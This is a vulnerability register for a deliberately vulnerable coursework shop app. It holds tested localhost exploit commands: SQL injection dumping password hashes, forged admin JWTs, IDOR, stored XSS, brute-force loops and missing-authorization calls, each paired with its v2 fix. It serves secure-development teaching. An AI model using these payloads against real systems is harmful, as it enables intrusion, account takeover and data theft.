# SecureCart v1 — Vulnerability Register

Intentionally planted flaws in the v1 (deliberately vulnerable) build of SecureCart,
for 24CY54 Secure SDLC coursework at MSRIT. Every entry below was exploited against
a locally running instance (`./scripts/seed.sh && ./scripts/start.sh`) and the exact
commands produced the result shown. **Run only on `127.0.0.1`.**

Seed accounts: `admin`/`admin123` (admin), `alice`/`alice123` (user), `bob`/`bob123` (user).

---

## VULN-01 — SQL Injection in product search

- **CWE:** CWE-89 (SQL Injection)
- **OWASP Top 10 (2021):** A03 — Injection
- **File:** `backend/app.py:129-136` (`search_products`), query built at line 132:
  `"SELECT id, name, description, price, stock FROM products WHERE name LIKE '%" + q + "%'"`
- **Exploit (tested):**
  ```bash
  curl -s -G http://127.0.0.1:8000/api/products/search \
    --data-urlencode "q=nonexistent' UNION SELECT id, username, password, role, 1 FROM users--"
  ```
  **Result:** returns all rows from `users` (username, MD5 password hash, role) reusing
  the products' JSON shape — confirmed dumping `admin`, `alice`, `bob` and their password hashes.
- **v2 fix:** use a parameterized query (`?` placeholder) instead of string concatenation.
- **Status (v2): FIXED.** `search_products` now binds `q` as a query parameter
  (`backend/app.py`, `search_products`); the UNION payload is treated as a literal
  string, not SQL. Regression test: `backend/tests/test_vuln01_sqli.py`.

## VULN-02 — IDOR on order detail

- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP Top 10 (2021):** A01 — Broken Access Control
- **File:** `backend/app.py:283-295` (`order_detail`) — the handler fetches the order by
  `id` alone and never compares `order["user_id"]` against the caller.
- **Exploit (tested):**
  ```bash
  TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/login -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"alice123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
  curl -s http://127.0.0.1:8000/api/orders/3 -H "Authorization: Bearer $TOKEN"
  ```
  **Result:** logged in as `alice`, but order #3 (`bob`'s order, `user_id: 3`) is returned in full,
  including items and the masked card digits.
- **v2 fix:** require `order["user_id"] == current_user.id` (or admin role) before returning the order.
- **Status (v2): FIXED.** `order_detail` (`backend/app.py`) now returns 404 unless the
  caller owns the order or has the `admin` role. Regression test:
  `backend/tests/test_vuln02_idor.py`.

## VULN-03 — Passwords stored as unsalted MD5

- **CWE:** CWE-328 (Use of Weak Hash) / CWE-759 (Use of a One-Way Hash without a Salt)
- **OWASP Top 10 (2021):** A02 — Cryptographic Failures
- **File:** `backend/auth.py:16-21` (`hash_password`, `verify_password`) —
  `hashlib.md5(password.encode()).hexdigest()`, no salt.
- **Exploit (tested):** dump hashes via VULN-01, then crack offline:
  ```bash
  python3 -c "import hashlib; print(hashlib.md5(b'admin123').hexdigest())"
  # -> 0192023a7bbd73250516f069df18b500
  ```
  **Result:** matches the hash dumped for `admin` exactly — any MD5 lookup table/rainbow
  table cracks it instantly because there's no per-user salt.
- **v2 fix:** hash with a strong salted algorithm (bcrypt/argon2/scrypt or PBKDF2 with a per-user salt).
- **Status (v2): FIXED.** `hash_password`/`verify_password` (`backend/auth.py`) now use
  Argon2id via `argon2-cffi`, which embeds a random per-hash salt. `seed.py` needed no
  change - it already calls `auth.hash_password`, so seeded users automatically get the
  new hashing. Regression test: `backend/tests/test_vuln03_password_hashing.py`.

## VULN-04 — No rate limiting or lockout on login

- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **OWASP Top 10 (2021):** A07 — Identification and Authentication Failures
- **File:** `backend/app.py:106` (`login`) — no attempt counter, delay, CAPTCHA, or lockout.
- **Exploit (tested):**
  ```bash
  for i in $(seq 1 8); do
    curl -s -o /dev/null -w "%{http_code} " -X POST http://127.0.0.1:8000/api/login \
      -H 'Content-Type: application/json' -d '{"username":"alice","password":"wrong"}'
  done
  ```
  **Result:** `401 401 401 401 401 401 401 401` — eight rapid guesses, no throttling, no block;
  the endpoint is open to unlimited brute-force / credential-stuffing attempts.
- **v2 fix:** add per-account/IP rate limiting and temporary lockout after repeated failures.
- **Status (v2): FIXED.** `login` (`backend/app.py`) now records every attempt in a new
  `login_attempts` table and rejects further attempts with HTTP 429 for 5 minutes after
  5 consecutive failures for a username, even with the correct password. Regression
  test: `backend/tests/test_vuln04_rate_limiting.py`.

## VULN-05 — Hardcoded JWT secret in source code

- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **OWASP Top 10 (2021):** A02 — Cryptographic Failures
- **File:** `backend/auth.py:10` — `SECRET_KEY = "securecart-secret-key-123"` committed in source.
- **Exploit (tested):** forge a valid admin token for user id 1, without ever logging in:
  ```bash
  python3 -c "
  import jwt
  print(jwt.encode({'sub':'1','username':'admin','role':'admin'}, 'securecart-secret-key-123', algorithm='HS256'))
  "
  curl -s http://127.0.0.1:8000/api/orders/3 -H "Authorization: Bearer <forged token>"
  ```
  **Result:** the server accepts the self-signed token and returns order #3 as "admin" —
  full account takeover with no credentials, because the signing secret is public in the repo.
- **v2 fix:** load the secret from an environment variable / secrets manager, never commit it; rotate it.
- **Status (v2): FIXED.** `backend/auth.py` now reads `SECURECART_JWT_SECRET` from the
  environment (via `backend/.env`, see `backend/.env.example`) and raises `RuntimeError`
  at import time if it is unset - the app refuses to start without it. Regression test:
  `backend/tests/test_vuln05_06_jwt_secret_and_expiry.py`.

## VULN-06 — JWTs that never expire

- **CWE:** CWE-613 (Insufficient Session Expiration)
- **OWASP Top 10 (2021):** A07 — Identification and Authentication Failures
- **File:** `backend/auth.py:26-32` (`create_token`) — payload has no `exp` claim.
- **Exploit (tested):**
  ```bash
  TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/login -H 'Content-Type: application/json' \
    -d '{"username":"bob","password":"bob123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
  python3 -c "import jwt; print(jwt.decode('$TOKEN', options={'verify_signature': False}))"
  # -> {'sub': '3', 'username': 'bob', 'role': 'user'}  (no 'exp' key at all)
  ```
  **Result:** decoded payload has no expiry claim, so a stolen token from months ago is still
  valid indefinitely; there is no way to force session expiry.
- **v2 fix:** add a short `exp` claim (e.g. 15–60 minutes) and a refresh-token flow.
- **Status (v2): FIXED (expiry only; refresh-token flow is noted as future work).**
  `create_token` (`backend/auth.py`) now sets `exp` to 30 minutes from issuance;
  `decode_token` rejects expired tokens (python-jose validates `exp` by default).
  Regression test: `backend/tests/test_vuln05_06_jwt_secret_and_expiry.py`.

## VULN-07 — Stored XSS in product reviews

- **CWE:** CWE-79 (Cross-Site Scripting)
- **OWASP Top 10 (2021):** A03 — Injection
- **Files:**
  - Backend: `backend/app.py:167` (`add_review`) — `text = body.review_text` stored verbatim, no sanitization/escaping.
  - Frontend sink: `frontend/src/pages/ProductDetail.jsx:75` —
    `<div dangerouslySetInnerHTML={{ __html: r.review_text }} />`
- **Exploit (tested):**
  1. Log in as `alice`, POST a review with an HTML payload:
     ```bash
     curl -s -X POST http://127.0.0.1:8000/api/products/1/reviews \
       -H "Authorization: Bearer <alice token>" -H 'Content-Type: application/json' \
       -d '{"rating":1,"review_text":"<img src=x onerror=\"document.title='"'"'XSS-FIRED'"'"'\">"}'
     ```
  2. Open `http://127.0.0.1:5173/products/1` in a browser.
  **Result:** the browser tab title changes to `XSS-FIRED` — confirmed by loading the page
  with Playwright and reading `document.title` after render. Any visitor (including an admin
  browsing products) executes the attacker's script.
- **v2 fix:** sanitize/escape on the backend before storing (or on render), and render review
  text as plain text (`{text}`) instead of `dangerouslySetInnerHTML`.
- **Status (v2): FIXED.** Backend: a pydantic validator on `ReviewBody.review_text`
  (`backend/app.py`) strips all HTML tags with `bleach.clean(..., tags=[], strip=True)`
  and rejects empty/oversized/out-of-range input (422). Frontend:
  `ProductDetail.jsx` now renders `<div>{r.review_text}</div>` instead of
  `dangerouslySetInnerHTML`. Regression test: `backend/tests/test_vuln07_stored_xss.py`.

## VULN-08 — Missing authorization on admin endpoints

- **CWE:** CWE-862 (Missing Authorization)
- **OWASP Top 10 (2021):** A01 — Broken Access Control
- **File:** `backend/app.py:302-336` — `admin_add_product` (line 305), `admin_edit_product`
  (line 318), `admin_delete_product` (line 330) all depend on `get_current_user` (any logged-in
  user), not a role check.
- **Exploit (tested):** logged in as `bob` (role `user`):
  ```bash
  curl -s -X POST http://127.0.0.1:8000/api/admin/products \
    -H "Authorization: Bearer <bob token>" -H 'Content-Type: application/json' \
    -d '{"name":"Hacked Product","description":"added by non-admin","price":1,"stock":1}'
  # -> {"id":11}   (HTTP 200)
  curl -s -X DELETE http://127.0.0.1:8000/api/admin/products/10 -H "Authorization: Bearer <bob token>"
  # -> {"ok":true} (HTTP 200)
  ```
  **Result:** a regular user created and deleted products — full catalog tampering with no admin role.
- **v2 fix:** add a `require_admin` dependency that checks `user["role"] == "admin"` and apply
  it to every `/api/admin/*` route.
- **Status (v2): FIXED.** `require_admin` (`backend/auth.py`) checks `user["role"] ==
  "admin"` and now gates all three admin routes in `backend/app.py`, returning 403 for
  non-admins. Regression test: `backend/tests/test_vuln08_admin_authz.py`.

## VULN-09 — Verbose errors leak stack traces and SQL errors

- **CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)
- **OWASP Top 10 (2021):** A05 — Security Misconfiguration
- **File:** `backend/app.py:33-43` (global `unhandled_error` handler returns `str(exc)`,
  exception type, request path and full `traceback.format_exc()`); and `backend/app.py:131-138`
  (`search_products` catches `sqlite3.Error` and returns the raw DB error **and** the
  interpolated SQL query text).
- **Exploit (tested):**
  ```bash
  curl -s -G http://127.0.0.1:8000/api/products/search --data-urlencode "q=Mouse'"
  ```
  **Result:**
  ```json
  {"error":"unrecognized token: \"'\"","query":"SELECT id, name, description, price, stock FROM products WHERE name LIKE '%Mouse'%'"}
  ```
  The raw SQLite error and the exact server-side query string (useful for crafting further
  injection payloads) are returned to the client.
- **v2 fix:** log the full exception server-side; return a generic message and a correlation ID to the client.
- **Status (v2): FIXED.** The global handler (`backend/app.py`) now logs the full
  exception type/message/traceback via Python's `logging` module and returns only a
  generic message plus a random `error_id` to the client. The ad hoc error branch
  inside `search_products` was removed entirely as part of the VULN-01 fix. Regression
  test: `backend/tests/test_vuln09_verbose_errors.py`.

## VULN-10 — CORS allows all origins

- **CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)
- **OWASP Top 10 (2021):** A05 — Security Misconfiguration
- **File:** `backend/app.py:19-28` — `CORSMiddleware(allow_origins=["*"], ...)`.
- **Exploit (tested):**
  ```bash
  curl -s -D - -o /dev/null http://127.0.0.1:8000/api/products -H "Origin: https://evil.example.com" \
    | grep -i access-control
  # -> access-control-allow-origin: *
  ```
  **Result:** the API reflects/allows any arbitrary origin, so a malicious site can call the
  SecureCart API directly from a victim's browser (e.g. to read their cart or orders if they
  are logged in and the token were accessible to script).
- **v2 fix:** restrict `allow_origins` to the known frontend origin(s) only.

## VULN-11 — No security headers

- **CWE:** CWE-693 (Protection Mechanism Failure)
- **OWASP Top 10 (2021):** A05 — Security Misconfiguration
- **File:** `backend/app.py:19-28` — no middleware sets `Content-Security-Policy`,
  `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, etc.
- **Exploit (tested):**
  ```bash
  curl -s -D - -o /dev/null http://127.0.0.1:8000/api/products \
    | grep -iE "x-frame-options|content-security-policy|x-content-type-options|strict-transport-security"
  ```
  **Result:** no output — none of these headers are present, confirmed missing.
- **v2 fix:** add `starlette`/FastAPI middleware (or a reverse proxy) to set CSP,
  `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, and HSTS.

## VULN-12 — Dependency with a known CVE

- **CWE:** CWE-1104 (Use of Unmaintained Third Party Components) / mapped to the specific CVEs below
- **OWASP Top 10 (2021):** A06 — Vulnerable and Outdated Components
- **File:** `backend/requirements.txt:7` — `python-jose[cryptography]==3.3.0` pinned on purpose.
  **Chosen dependency/CVE:** `python-jose` ≤ 3.3.0 is affected by **CVE-2024-33663**
  (algorithm-confusion vulnerability with OpenSSH ECDSA keys, allowing token forgery) and
  **CVE-2024-33664** (JWE decompression bomb / DoS). Both are fixed in 3.4.0. This is the
  JWT library actually used in `backend/auth.py`.
- **Exploit (tested):** run a dependency scanner against `backend/requirements.txt`:
  ```bash
  pip install pip-audit
  pip-audit -r backend/requirements.txt
  ```
  **Result:** `pip-audit` (or any SCA tool / Dependency-Check / Snyk / GitHub Dependabot) flags
  `python-jose 3.3.0` for CVE-2024-33663 / CVE-2024-33664.
- **v2 fix:** upgrade to `python-jose>=3.4.0` (or migrate to `PyJWT`), and keep dependencies current.

---

## Cross-cutting note

VULN-05 (hardcoded secret) and VULN-06 (no expiry) compound each other: a leaked secret lets
an attacker mint tokens for *any* user id/role that never expire, which is why the forged-admin
exploit above works with no rate limiting (VULN-04) or detection in place.
